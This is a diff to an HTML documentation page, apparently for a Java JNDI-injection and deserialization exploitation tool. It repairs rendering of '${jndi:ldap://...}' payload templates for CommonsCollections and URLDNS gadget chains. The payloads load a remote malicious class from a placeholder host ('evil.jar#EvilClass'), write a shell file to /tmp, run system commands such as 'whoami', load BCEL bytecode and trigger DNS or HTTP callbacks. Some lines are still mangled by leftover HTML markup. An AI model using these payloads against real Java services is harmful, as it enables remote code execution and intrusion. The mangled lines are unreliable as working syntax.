@@ -3908,7 +3908,7 @@
 </span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a>TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10
 </span></code></pre></div>
 {{url
-    (<span class="arithmatex">\({jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
         (TS-10)
     }}})
 }}
@@ -3916,14 +3916,14 @@
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
 </span></code></pre></div>
 {{url
-    (\)</span>{jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
         (RC-<a href="http://xxxx.com/evil.jar#EvilClass">http://xxxx.com/evil.jar#EvilClass</a>)
     }}})
 }}
 <div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#d2hvYW1p
 </span></code></pre></div>
 {{url
-    (<span class="arithmatex">\({jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
         (WF-/tmp/shell#d2hvYW1p)
     }}})
 }}
@@ -3931,7 +3931,7 @@
 </span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>分别在不同操作系统执行命令
 </span></code></pre></div>
 {{url
-    (\)</span>{jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
         (PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==)
     }}})
 }}
@@ -3939,35 +3939,35 @@
 </span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>SE-d2hvYW1
 </span></code></pre></div>
 {{url
-    (<span class="arithmatex">\({jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
         (SE-d2hvYW1)
     }}})
 }}
 <div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>DL ：DNS LOG - 通过 InetAddress.getAllByName() 来触发 DNS 解析，使用命令 DL-xxxdnslog.cn
 </span></code></pre></div>
 {{url
-    (\)</span>{jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
         (DL-xxxdnslog.cn)
     }}})
 }}
 <div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>HL ：HTTP LOG - 通过 URL.getContent() 来触发 HTTP LOG，使用命令 HL-http://xxx.com
 </span></code></pre></div>
 {{url
-    (<span class="arithmatex">\({jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
-        (HL-http://xxx.com)
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (HL-<a href="http://xxx.com">http://xxx.com</a>)
     }}})
 }}
 <div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() 来加载 BCEL 类字节码，使用命令 BC-$BCEL$xxx
 </span></code></pre></div>
 {{url
-    (\)</span>{jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
-        (BC-<span class="arithmatex">\(BCEL\)</span>xxx)
+    (<span class="arithmatex">\({jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (BC-\)</span>BCEL$xxx)
     }}})
 }}
 <div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>其他：普通命令执行 - 通过 Runtime.getRuntime().exec() 执行系统命令，使用命令 whoami
 </span></code></pre></div>
 {{url
-    (<span class="arithmatex">\({jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
         (whoami)
     }}})
 }}
@@ -3976,7 +3976,7 @@
 </span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>对于除了以上的利用链,使用的是 `TemplatesImpl` 类来实现。
 </span></code></pre></div>
 {{url
-    (\)</span>{jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
         (whoami)
     }}})
 }}
@@ -3992,7 +3992,7 @@
 </span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>**class 类文件绝对路径**
 </span></code></pre></div>
 {{url
-  (<span class="arithmatex">\({jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
+  (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
       (LF#/tmp/evil.class-org)
   }}})
 }}
@@ -4010,7 +4010,7 @@
 </span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>+ 指定类：使用对应链中的关键字 CommonsCollections24:xxxx.dns.log 。
 </span></code></pre></div>
 {{url
-    (\)</span>{jndi:ldap://0.0.0.0:1389/Deserialization/URLDNS/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/URLDNS/nu1r/Base64/{{base64
         (all:xxxxxx.dns.log)
     }}})
 }}
